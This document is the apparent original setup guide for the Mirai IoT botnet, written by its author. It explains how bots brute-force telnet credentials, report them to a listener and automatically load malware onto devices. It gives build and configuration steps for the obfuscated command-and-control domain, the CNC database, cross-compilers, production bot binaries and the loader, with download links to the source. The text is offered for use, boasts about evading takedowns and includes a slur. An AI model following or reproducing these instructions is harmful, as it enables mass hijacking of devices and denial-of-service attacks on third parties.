#Infrastructure Overview
- To establish connection to CNC, bots resolve a domain (resolv.c/resolv.h) and connect to that IP address
- Bots brute telnet using an advanced SYN scanner that is around 80x faster than the one in qbot, and uses almost 20x less resources. When finding bruted result, bot resolves another domain and reports it. This is chained to a separate server to automatically load onto devices as results come in.
- Bruted results are sent by default on port 48101. The utility called scanListen.go in tools is used to receive bruted results (I was getting around 500 bruted results per second at peak). If you build in debug mode, you should see the utitlity scanListen binary appear in debug folder.

Mirai uses a spreading mechanism similar to self-rep, but what I call "real-time-load". Basically, bots brute results, send it to a server listening with scanListen utility, which sends the results to the loader. This loop (brute -> scanListen -> load -> brute) is known as real time loading.

The loader can be configured to use multiple IP address to bypass port exhaustion in linux (there are limited number of ports available, which means that there is not enough variation in tuple to get more than 65k simultaneous outbound connections - in theory, this value lot less). I would have maybe 60k - 70k simultaneous outbound connections (simultaneous loading) spread out across 5 IPs.

#Configuring Bot
Bot has several configuration options that are obfuscated in (table.c/table.h). In ./mirai/bot/table.h you can find most descriptions for configuration options. However, in ./mirai/bot/table.c there are a few options you *need* to change to get working.

- TABLE_CNC_DOMAIN - Domain name of CNC to connect to - DDoS avoidance very fun with mirai, people try to hit my CNC but I update it faster than they can find new IPs, lol. Retards :)
- TABLE_CNC_PORT - Port to connect to, its set to 23 already
- TABLE_SCAN_CB_DOMAIN - When finding bruted results, this domain it is reported to
- TABLE_SCAN_CB_PORT - Port to connect to for bruted results, it is set to 48101 already.

In ./mirai/tools you will find something called enc.c - You must compile this to output things to put in the table.c file

Run this inside mirai directory
```
./build.sh debug telnet
```
You will get some errors related to cross-compilers not being there if you have not configured them. This is ok, won't affect compiling the enc tool

Now, in the ./mirai/debug folder you should see a compiled binary called enc. For example, to get obfuscated string for domain name for bots to connect to, use this:
```
./debug/enc string fuck.the.police.com
```
The output should look like this
```
XOR'ing 20 bytes of data...
\x44\x57\x41\x49\x0C\x56\x4A\x47\x0C\x52\x4D\x4E\x4B\x41\x47\x0C\x41\x4D\x4F\x22
```

To update the TABLE_CNC_DOMAIN value for example, replace  that long hex string with the one provided by enc tool. Also, you see "XOR'ing 20 bytes of data". This value must replace the last argument tas well. So for example, the table.c line originally looks like this

```
add_entry(TABLE_CNC_DOMAIN, "\x41\x4C\x41\x0C\x41\x4A\x43\x4C\x45\x47\x4F\x47\x0C\x41\x4D\x4F\x22", 30); // cnc.changeme.com
```

Now that we know value from enc tool, we update it like this
```
add_entry(TABLE_CNC_DOMAIN, "\x44\x57\x41\x49\x0C\x56\x4A\x47\x0C\x52\x4D\x4E\x4B\x41\x47\x0C\x41\x4D\x4F\x22", 20); // fuck.the.police.com
```

Some values are strings, some are port (uint16 in network order / big endian).

#Configuring the CNC
```
apt-get install mysql-server mysql-client
```
CNC requires database to work. When you install database, go into it and run following commands:

```
# RUN ALL OF THESE AS A PRIVELEGED USER, SINCE WE ARE DOWNLOADING INTO /etc

apt-get install gcc golang electric-fence

mkdir /etc/xcompile
cd /etc/xcompile

wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2

tar -jxf cross-compiler-armv4l.tar.bz2
tar -jxf cross-compiler-i586.tar.bz2
tar -jxf cross-compiler-m68k.tar.bz2
tar -jxf cross-compiler-mips.tar.bz2
tar -jxf cross-compiler-mipsel.tar.bz2
tar -jxf cross-compiler-powerpc.tar.bz2
tar -jxf cross-compiler-sh4.tar.bz2
tar -jxf cross-compiler-sparc.tar.bz2

rm *.tar.bz2
mv cross-compiler-armv4l armv4l
mv cross-compiler-i586 i586
mv cross-compiler-m68k m68k
mv cross-compiler-mips mips
mv cross-compiler-mipsel mipsel
mv cross-compiler-powerpc powerpc
mv cross-compiler-sh4 sh4
mv cross-compiler-sparc sparc










# PUT THESE COMMANDS IN THE FILE ~/.bashrc

# Cross compiler toolchains
export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/powerpc-440fp/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin

# Golang
export PATH=$PATH:/usr/local/go/bin
export GOPATH=$HOME/Documents/go

-- END --
```


This will create database for you. To add your user,
```
INSERT INTO users VALUES (NULL, 'josh-G', 'mypasswordblahah', 0, 0, 0, 0, -1, 1, 30, '');
```

Now, go into file ./mirai/cnc/main.go

Edit these values

```
const DatabaseAddr string   = "127.0.0.1"
const DatabaseUser string   = "root"
const DatabasePass string   = "password"
const DatabaseTable string  = "mirai"
```

To the information for the mysql server you just installed


#Setting Up Cross Compilers
Cross compilers are easy, follow the instructions at this link to set up. You must restart your system or reload .bashrc file for these changes to take effect.

http://pastebin.com/1rRCc3aD

#Building CNC+Bot
The CNC, bot, and related tools:
1) http://santasbigcandycane.cx/mirai.src.zip - ### THESE LINKS WILL NOT LAST FOREVER
![Alt text](http://i.imgur.com/BVc7qJs.png "Optional title")


2) http://santasbigcandycane.cx/loader.src.zip - ### THESE LINKS WILL NOT LAST FOREVER

How to build bot + CNC
In mirai folder, there is build.sh script.

```
./build.sh debug telnet
```
Will output debug binaries of bot that will not daemonize and print out info about if it can connect to CNC, etc, status of floods, etc. Compiles to ./mirai/debug folder

```
./build.sh release telnet
```
Will output production-ready binaries of bot that are extremely stripped, small (about 60K) that should be loaded onto devices. Compiles all binaries in format: "mirai.$ARCH" to ./mirai/release folder


[size=x-large]Building Echo Loader[/size]
Loader reads telnet entries from STDIN in following format: 
[code]ip:port user:pass[/code]
It detects if there is wget or tftp, and tries to download the binary using that. If not, it will echoload a tiny binary (about 1kb) that will suffice as wget.

```
./build.sh
```
Will build the loader, optimized, production use, no fuss. If you have a file in formats used for loading, you can do this
```
cat file.txt | ./loader
```

Remember to ulimit!

##Also:
Just so it's clear, I'm not providing any kind of 1 on 1 help tutorials or shit, too much time. All scripts and everything are included to set up working botnet in under 1 hours. I am willing to help if you have individual questions (how come CNC not connecting to database, I did this this this blah blah), but not questions like "My bot not connect, fix it"


